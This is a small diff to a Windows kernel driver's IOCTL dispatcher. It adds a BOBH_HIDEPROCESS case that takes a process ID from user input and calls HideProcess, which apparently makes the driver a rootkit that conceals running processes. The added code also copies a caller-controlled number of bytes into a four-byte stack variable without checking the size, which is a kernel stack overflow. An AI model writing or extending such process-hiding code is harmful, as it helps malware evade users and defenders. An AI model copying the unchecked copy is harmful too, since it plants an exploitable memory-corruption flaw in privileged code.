@@ -160,6 +160,13 @@ NTSTATUS DispatchDevCTL(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 
 		break;
 	}
+	case BOBH_HIDEPROCESS:
+	{
+		DWORD PID;
+		RtlCopyMemory(&PID, buffer, uInSize);
+		status = HideProcess(PID);
+		break;
+	}
 	default:
 		status = STATUS_INVALID_PARAMETER;
 		break;
